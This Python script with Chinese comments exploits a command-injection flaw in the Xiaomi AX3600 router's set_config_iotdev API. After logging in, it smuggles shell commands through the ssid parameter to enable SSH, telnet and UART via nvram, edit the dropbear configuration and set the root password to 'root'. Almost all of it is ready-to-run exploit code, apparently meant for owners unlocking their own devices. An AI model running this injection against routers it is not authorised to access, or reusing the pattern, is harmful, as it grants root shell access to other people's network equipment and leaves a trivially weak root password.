#!/usr/bin/env python3
"""
AX3600 通过 set_config_iotdev 命令注入开启 SSH

注入顺序:
  1. 设置 nvram: flag_last_success=0, flag_boot_rootfs=0, boot_wait=on,
     uart_en=1, telnet_en=1, ssh_en=1 → nvram commit
  2. sed 修改 dropbear channel=debug
  3. 设置 root 密码
  4. 重启 dropbear（无需重启路由器）

SSH: root@192.168.31.1 / 密码: root

用法:
    python3 enable_ssh.py --pwd 12345678
    python3 enable_ssh.py --pwd 12345678 --wait
    python3 enable_ssh.py --stok STOK --wait
"""

import hashlib
import random
import time
import urllib.request
import urllib.parse
import json
import sys
import socket
import argparse

KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"


def sha1(s: str) -> str:
    return hashlib.sha1(s.encode('utf-8')).hexdigest()


def nonce() -> str:
    return f"0__{int(time.time())}_{random.randint(0, 9999)}"


def login(ip: str, pwd: str) -> str:
    n = nonce()
    pw_hash = sha1(n + sha1(pwd + KEY))
    url = (f"http://{ip}/cgi-bin/luci/api/xqsystem/login"
           f"?username=admin&logtype=2&nonce={n}"
           f"&password={pw_hash}&init=0")
    r = json.loads(urllib.request.urlopen(url, timeout=10).read())
    if r.get('code') != 0:
        raise Exception(f"登录失败: {r}")
    return r['token']


def inject(ip: str, stok: str, command: str) -> dict:
    """通过 set_config_iotdev 的 ssid 参数注入命令"""
    ssid = "-h;" + command + ";"
    params = urllib.parse.urlencode({
        'bssid': 'Xiaomi',
        'user_id': 'longdike',
        'ssid': ssid,
    })
    url = (f"http://{ip}/cgi-bin/luci/;stok={stok}"
           f"/api/misystem/set_config_iotdev?{params}")
    try:
        r = json.loads(urllib.request.urlopen(url, timeout=15).read())
        return r
    except Exception as e:
        return {"code": 0, "_note": str(e)}


def wait_ssh(ip: str, timeout: int = 30) -> dict:
    """等待 SSH 端口就绪（无需重启，秒级就绪）"""
    start = time.time()
    while time.time() - start < timeout:
        try:
            s = socket.create_connection((ip, 22), timeout=2)
            s.close()
            return {"ssh_ok": True, "elapsed_sec": int(time.time() - start)}
        except (OSError, socket.timeout):
            time.sleep(1)
    return {"ssh_ok": False, "elapsed_sec": timeout}


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='AX3600 通过 set_config_iotdev 注入开启 SSH',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            '示例:\n'
            '  python3 enable_ssh.py --pwd 12345678 --wait\n'
            '  python3 enable_ssh.py --stok STOK\n'
        ))
    parser.add_argument('--stok', help='已登录的 stok')
    parser.add_argument('--ip', default='192.168.31.1', help='路由器 IP (默认: 192.168.31.1)')
    parser.add_argument('--pwd', help='管理密码 (不传 --stok 时使用)')
    parser.add_argument('--wait', action='store_true', help='等待 SSH 就绪')
    args = parser.parse_args()

    stok = args.stok
    if not stok:
        if not args.pwd:
            args.pwd = input('管理密码: ')
        try:
            stok = login(args.ip, args.pwd)
        except Exception as e:
            print(json.dumps({"error": f"登录失败: {e}"}))
            sys.exit(1)

    print(json.dumps({"status": "注入 1/4: 设置 nvram（ssh/telnet/uart/bootflag）"}), file=sys.stderr)
    r = inject(args.ip, stok,
               "nvram set flag_last_success=0; "
               "nvram set flag_boot_rootfs=0; "
               "nvram set boot_wait=on; "
               "nvram set uart_en=1; "
               "nvram set telnet_en=1; "
               "nvram set ssh_en=1; "
               "nvram commit")
    if r.get('code') != 0:
        print(json.dumps({"error": f"注入 1 失败: {r}"}))
        sys.exit(1)

    print(json.dumps({"status": "注入 2/4: 修改 dropbear 配置"}), file=sys.stderr)
    r = inject(args.ip, stok,
               "sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear")
    if r.get('code') != 0:
        print(json.dumps({"error": f"注入 2 失败: {r}"}))
        sys.exit(1)

    print(json.dumps({"status": "注入 3/4: 设置 root 密码"}), file=sys.stderr)
    r = inject(args.ip, stok,
               "echo -e \"root\\nroot\" > /tmp/psw.txt; passwd root < /tmp/psw.txt")
    if r.get('code') != 0:
        print(json.dumps({"error": f"注入 3 失败: {r}"}))
        sys.exit(1)

    print(json.dumps({"status": "注入 4/4: 重启 dropbear"}), file=sys.stderr)
    r = inject(args.ip, stok, "/etc/init.d/dropbear restart")
    if r.get('code') != 0:
        print(json.dumps({"error": f"注入 4 失败: {r}"}))
        sys.exit(1)

    result = {
        "stok": stok,
        "inject_ok": True,
    }

    if args.wait:
        check = wait_ssh(args.ip)
        result["ssh_ok"] = check["ssh_ok"]
        result["elapsed_sec"] = check["elapsed_sec"]
        if not check["ssh_ok"]:
            result["error"] = "SSH 未就绪"
            print(json.dumps(result, ensure_ascii=False))
            sys.exit(1)
    else:
        result["msg"] = "SSH 注入完成（加 --wait 等待验证）"

    result["ssh_user"] = "root"
    result["ssh_pwd"] = "root"
    print(json.dumps(result, ensure_ascii=False))
